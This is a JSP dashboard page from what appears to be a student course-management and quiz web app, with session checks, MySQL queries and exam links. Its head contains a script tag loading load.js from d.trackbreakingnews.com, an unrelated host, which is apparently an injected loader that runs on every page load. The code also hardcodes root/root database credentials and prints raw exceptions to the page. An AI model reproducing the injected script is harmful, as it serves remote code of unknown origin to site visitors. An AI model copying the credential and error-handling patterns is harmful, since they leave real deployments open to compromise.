
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
    <%@ page import="java.sql.*" %>     <%@ page import= "java.io.*" %>
<%@ page import="javax.servlet.RequestDispatcher" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<head>

  	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Data</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="${pageContext.request.contextPath}/css/styles.css">
   
    <style type="text/css">
  body{

	background-image:url("iWall/appx.jpg");
	background-size:cover;
}
 .ZX a{
    color:#fff;
    font-family: Lato;
    font-weight: 800px;
    text-decoration: none;
    
    }
    .ZX a:hover{
    color:#17AEDF;
    font-family: Droid-sans;
    font-weight: bold;
    text-decoration: none;
    
    }
.button {
	padding: 10px 15px;
	font-size: 14px;
	line-height: 100%;
	text-shadow: 0 1px rgba(0, 0, 0, 0.4);
	color: #fff;
	
	vertical-align: middle;
	text-align: center;
	cursor: pointer;
	font-weight: bold;
	transition: background 0.1s ease-in-out;
	-webkit-transition: background 0.1s ease-in-out;
	-moz-transition: background 0.1s ease-in-out;
	-ms-transition: background 0.1s ease-in-out;
	-o-transition: background 0.1s ease-in-out;
	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
	color: #fff;
	-webkit-border-radius: 40px;
	-moz-border-radius: 40px;
	border-radius: 40px;
	font-family: 'Helvetica Neue', Helvetica, sans-serif;
}

.button, .button:hover, .button:active {
	outline: 0 none;
	text-decoration: none;
        color: #fff;
}

.username {
	background-color: #2ecc71;
	box-shadow: 0px 3px 0px 0px #239a55;
}

</style>

    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style type="text/css">
    .Cvv {
    padding-top: 55px;
    }
    .ZX{ 
    padding-top: 50px;
    }
    .JSS img{
    height: 155px;
    width: 145px;
    }
    
        .CSS img{
    height: 160px;
    width: 130px;
    }
           .PHP img{
    height: 160px;
    width: 130px;
    }
            .SQL img{
    height: 180px;
    width: 130px;
    }
            .LNX img{
    height: 156px;
    width: 117px;
   position: relative;
   right:370px;
   bottom: 160px;
    }
              .PTN img{
    height: 170px;
    width: 160px;
    }
   .MD img{
    height: 170px;
    width: 160px;
    }
    .NM {
  top:-45px;
  position: relative;
  left:45px;
  }
  </style>
 
  </head>
  <body>
	<%
  		String user=(String) session.getAttribute("xmail");
  		String user1=(String) session.getAttribute("xuser");
  		String user2=(String) session.getAttribute("xguest");
  	  		if((user==null)&&(user1==null) && (user2==null)){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>
                  	<div class="navbar navbar-inverse navbar-fixed-top pulse animated">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					
					
						 <%
						 session=request.getSession();
                   		String ssx1=(String) session.getAttribute("xuser1");
                   		String ssx2=(String) session.getAttribute("xuser2");
                   		String ssx3=(String) session.getAttribute("xadmin");
						if(ssx1==null && ssx2==null&& ssx3==null){
                     %>
                     <li> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}
						 if(ssx1==null && ssx3==null){%>
						
						<li> <a href="Home2.jsp">Home</a></li>
					<li> <a href="Course.jsp">Course</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ssx2 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Lout.jsp">Logout</a> </li>
						
						<%} %>
						
						
						<%
						 if(ssx2==null && ssx3==null){%>
						
						<li > <a href="Home2.jsp">Home</a></li>
					<li  > <a href="Course.jsp">Course</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ssx1 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Logout2.jsp">Logout</a> </li>
						
						<%} %>
						<%
						 session=request.getSession();
                   		String ss1=(String) session.getAttribute("xadmin");
                   		String ss3=(String) session.getAttribute("xuser1");
                   		String ss2=(String) session.getAttribute("xuser2");
						if(ss1==null && ss2==null && ss3==null){
                     %>
                     <li class="active"> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}%>
					
					
					<%if(ss2==null && ss3==null) { %>
					<%
				Connection conn9x=null;
				PreparedStatement ps9x=null;
				ResultSet rs9x=null;
				OutputStream oImagex;
				
	try
	{
		Class.forName("com.mysql.jdbc.Driver");
		conn9x=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		String query9x="Select * From admin1";
		ps9x=conn9x.prepareStatement(query9x);
		rs9x=ps9x.executeQuery();
		String sss=null;
		String sss1=null;
		String sss2=null;
		%>
	
		<% if(rs9x.next())
		{%>
		
		<tr style="border-bottom-style:solid;">
		<td>
		<input type="image" src="imageDisplayx.jsp?imgid=<%=rs9x.getInt(1)%>" class="fadeInDown animated img-circle" width="45" height="45">
		<li class="NM"><a href="Owner1.jsp"></a></li></td>
		</tr>
		<li > <a href="Home2.jsp">Home</a></li>
					<li  > <a href="Course.jsp">Course</a></li>
 			
		<%conn9x.close();%>
		

		<%}%>
</table>
	<% }catch(Exception e)
	{
		out.println(e);
		
	}%>
					<li class="dropdown">
					<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
					<ul class="dropdown-menu">
					<%

	Connection conn9=null;
	PreparedStatement ps9=null;
	ResultSet rs9=null;
	OutputStream oImage;
	String query9="Select * From admin1";
	
	try
	{
		Class.forName("com.mysql.jdbc.Driver");
		conn9=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		ps9=conn9.prepareStatement(query9);
		rs9=ps9.executeQuery();
		%>
	
		<% if(rs9.next())
		{%>
		<tr style="border-bottom-style:solid;">
		<td><input type="image" src="imageDisplayx.jsp?imgid=<%=rs9.getInt(1)%>" class="fadeInDown animated img-circle" width="55" height="55"><li class="NM"><a href="Owner1.jsp"><%=rs9.getString(2)%></a></li></td>
		</tr>
	
		<%}%>
</table>
	<% }catch(Exception e)
	{
		out.println(e);
		
	}%>
</td>
</tr><%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
						
						<%
						int countx=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from sub";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						countx++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
						
						<li class="divider"></li>
						<li><a href="Forgot1.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
						<li><a href="Sub2.jsp">Subscribers <span class="badge"> <%=countx %> </span></a></li>
						<li class="divider"></li>
						<li><a href="Logout.jsp">Logout</a></li>
					</UL>
						
<%}%>
					</ul>
	          </div> 
	      </div>
	  </div>
<br/><br/><br/>
<div class="container">
<div class="row">
<div class="col-lg-3">
	<ul class="nav nav-pills nav-stacked" id="sidebar"><hr>
<div class="progress">
  <div class="progress-bar" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 100%;">
    <span class="sr-only"></span>
  </div>
</div>
  <li role="presentation" class="active fadeInDown animated"><a href="News.jsp">News-Events</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Data1.jsp">DashBoard</a></li>
   						<%
   						session=request.getSession();
                   		String sxs1=(String) session.getAttribute("xuser");
						if((sxs1==null) && (ss3==null)){
                     	%>
  <li role="presentation" class="active fadeInDown animated"><a href="UserManage.jsp">User Registration</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Manage.jsp">User Management</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Department.jsp">Department</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="FeedDel.jsp">Manage Feedback</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="Msg2.jsp">Manage Messages</a></li>
  <%} %>
 <li role="presentation" class="active fadeInDown animated"><a href="Sview.jsp">Syllabus</a></li>
 <li role="presentation" class=" fadeInDown animated"><a href="home.jsp">Quiz</a></li>
  <li role="presentation" class="active fadeInDown animated"><a href="About.jsp">About Us</a><hr></li>
</ul>
</div>

<div class=" ZX">
	<div class="col-lg-2">

	<a href="takeExam?test=java"><img height="200" width="200" src="${pageContext.request.contextPath}/images/java-logo.png" class="img-responsive"/></a>
<hr>
	
	</div>
	
		<div class="col-lg-2 JSS">
<a href="takeExam?test=javascript"><img height="200" width="200" src="${pageContext.request.contextPath}/images/JS.png" class="img-responsive"/></a>
	<hr>
	</div>
	
		<div class="col-lg-2 CSS">
	
<a href="takeExam?test=css"><img height="200" width="200" src="${pageContext.request.contextPath}/images/url.png" class="img-responsive"/></a>
	<hr>
	</div>
		<div class="col-lg-3 PHP">
	
	<a href="takeExam?test=php"><img height="200" width="200" src="${pageContext.request.contextPath}/images/PHP_LOGO.PNG" class="img-responsive"/></a>
	<hr>
	</div></div>
	<div class="row">
		<div class="col-lg-2 SQL">
<a href="takeExam?test=sql"><img height="200" width="200" src="${pageContext.request.contextPath}/images/SQL.png" class="img-responsive"/></a>
	</div>
	
<div class="row">
		<div class="col-lg-2 PTN">
	
<a href="takeExam?test=python"><img height="200" width="200" src="${pageContext.request.contextPath}/images/python_sh-600x600.png" class="img-responsive"/></a>
	
	</div>
	<div class="col-lg-2 MD">
	<a href="takeExam?test=mongodb"><img height="200" width="200" src="${pageContext.request.contextPath}/images/mongo_bumper.sh-600x600.png" class="img-responsive"/></a>

	
	</div>
		<div class="col-lg-2 LNX">
	
<a href="takeExam?test=linux"><img height="200" width="200" src="${pageContext.request.contextPath}/images/urvl.png"/></a>
	
</div></div>
	</div>
		
	
	</div>
</div><div class="Cvv">
						<div class="container-fluid FFF fadeInUp animated"">
							<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div>
	
                   
    <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>

